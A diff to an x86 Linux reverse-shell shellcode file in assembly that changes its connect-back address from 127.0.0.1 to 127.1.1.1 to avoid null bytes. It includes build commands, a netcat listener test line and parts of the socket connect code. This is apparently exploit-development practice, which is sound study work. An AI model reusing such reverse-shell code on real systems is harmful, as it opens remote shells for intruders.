@@ -34,14 +34,14 @@
 ; shell_reverse_tcp
 ;
 ; * 72 bytes
-; * null-bytes free if the address is
+; * null-bytes free if the address and port are
 ;
 ;
 ; # nasm -f elf32 shell_reverse_tcp.asm -o shell_reverse_tcpl.o
 ; # ld -m elf_i386 shell_reverse_tcp.o -o shell_reverse_tcp
 ;
 ; Testing
-; # nc -l 127.0.0.1 55555
+; # nc -l 127.1.1.1 55555
 ; # ./shell_reverse_tcp
 
 
@@ -52,7 +52,7 @@ section .text
 _start:
 
 	; host
-	push 0x0100007f		; IP Number "127.0.0.1" in hex reverse order
+	push 0x0101017f		; IP Number "127.1.1.1" in hex reverse order
 	pop esi
 
 	; port
@@ -102,7 +102,7 @@ dup_loop:
 
 	; Connecting the duplicated file descriptor to the host
 	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-	; connect(sockfd, [AF_INET, 55555, 127.0.0.1], 16)
+	; connect(sockfd, [AF_INET, 55555, 127.1.1.1], 16)
 
 	mov al, 102		; syscall 102 - socketcall
 				; socketcall type (sys_connect) 3 - ebx already has it
